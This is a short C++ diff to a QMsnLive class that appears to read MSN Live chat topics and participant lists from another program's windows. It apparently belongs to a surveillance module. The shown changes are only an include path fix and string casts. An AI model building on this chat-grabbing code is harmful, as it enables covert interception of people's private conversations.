@@ -12,12 +12,12 @@
 using namespace std;
 
 #include "QMsnLive.h"
-#include "..\common.h"
+#include "../../H4DLL/common.h"
 #define MIN_SEARCH_LENGTH 200
 
 PWCHAR QMsnLive::wChatTree[] = {
-	L"IMWindowClass",
-	L"DirectUIHWND",
+	(PWCHAR)L"IMWindowClass",
+	(PWCHAR)L"DirectUIHWND",
 	0
 };
 
@@ -181,7 +181,7 @@ BOOL QMsnLive::GrabTopic()
 	ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 0);
 
 	if(uCount == 3)
-		properties.SetId(L"");
+		properties.SetId((PWCHAR)L"");
 	else{
 		ole.GetLineFromContainer(&bChat, 0);
 		properties.SetId(bChat);
@@ -201,7 +201,7 @@ BOOL QMsnLive::GrabUserList()
 	BOOL bFound = FALSE;
 
 	if(!FNC(IsWindow)(ole.GetHandle())){
-		properties.SetUsers(L"");
+		properties.SetUsers((PWCHAR)L"");
 		return FALSE;
 	}
 
